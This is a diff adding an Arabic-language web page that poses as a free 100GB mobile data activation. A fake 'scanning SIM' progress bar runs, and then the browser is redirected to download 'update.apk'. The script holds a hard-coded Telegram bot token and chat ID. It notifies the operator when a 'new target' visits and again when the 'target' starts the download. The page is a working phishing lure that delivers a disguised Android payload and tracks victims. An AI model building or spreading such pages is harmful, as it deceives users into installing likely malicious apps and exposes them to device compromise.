@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تنشيط باقة الـ 100GB</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #0a0a0a; color: #eee; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { background: #1a1a1a; padding: 30px; border-radius: 15px; text-align: center; width: 90%; max-width: 400px; border: 1px solid #333; }
+        .bar-bg { background: #333; border-radius: 10px; height: 10px; margin: 20px 0; overflow: hidden; }
+        .bar-fill { background: #4CAF50; height: 100%; width: 0%; transition: 0.1s; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h2>📡 جاري تنشيط باقة الـ 100GB</h2>
+    <p id="status">جاري فحص الشريحة: 0%</p>
+    <div class="bar-bg"><div class="bar-fill" id="fill"></div></div>
+</div>
+<script>
+    const token = "8378572092:AAGF5CC5KNNhbXp0Sc4tO10JYutLs3wrEr8";
+    const chatID = "8593367876";
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=🌐 دخل هدف جديد للمستودع الجديد!`);
+
+    let w = 0;
+    let inter = setInterval(() => {
+        w++;
+        document.getElementById('fill').style.width = w + '%';
+        document.getElementById('status').innerText = "جاري التنشيط: " + w + "%";
+        if(w >= 100) {
+            clearInterval(inter);
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=📥 الهدف بدأ تحميل الملف الآن!`);
+            // التوجيه لملفك المرفوع حالياً
+            window.location.href = "update.apk";
+        }
+    }, 50);
+</script>
+</body>
+</html>
+
